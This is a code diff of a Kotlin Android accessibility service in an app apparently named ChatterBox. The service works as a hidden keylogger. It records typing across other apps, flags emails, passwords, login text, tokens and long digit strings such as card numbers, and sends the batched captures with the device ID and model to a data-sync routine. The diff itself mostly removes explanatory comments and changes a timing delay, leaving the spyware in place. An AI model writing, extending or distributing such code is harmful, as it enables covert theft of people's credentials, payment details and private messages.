@@ -22,7 +22,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     private val keylogBuffer = StringBuilder()
     private var currentFocusedApp = ""
     private var lastInputTime = 0L
-    private val keylogFlushDelay = 5000L // 5 seconds without typing to collect a batch
+    private val keylogFlushDelay = 5000L
 
     private val deviceId by lazy {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
@@ -82,9 +82,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 handler.removeCallbacks(keylogFlushRunnable)
                 handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)
 
-                // Check for potentially sensitive information
                 if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
-                    // Broadcast to MainActivity
                     val intent = Intent("com.example.ChatterBox.ACCESSIBILITY_DATA")
                     intent.putExtra("captured_text", sourceText)
                     intent.putExtra("source_app", packageName)
@@ -106,7 +104,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
                     handler.postDelayed({
                         checkAllWindowsForPermissionDialogs()
-                    }, 200)
+                    }, 300)
                 }
             }
         }
@@ -128,11 +126,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 put("device_model", android.os.Build.MODEL)
                 put("android_version", android.os.Build.VERSION.RELEASE)
             }
-
             val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
             dataSynchronizer.sendData("keylog", keylogData.toString())
-
-            // Clear buffer
             keylogBuffer.clear()
 
         } catch (e: Exception) {
@@ -145,10 +140,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
         if (lowercase.contains("@") && lowercase.contains(".")) return true
 
-        // Look for credit card number patterns (4+ consecutive digits)
         if (Regex("\\d{4,}").containsMatchIn(text)) return true
 
-        // Other sensitive terms
         return lowercase.contains("password") ||
                 lowercase.contains("login") ||
                 lowercase.contains("token") ||
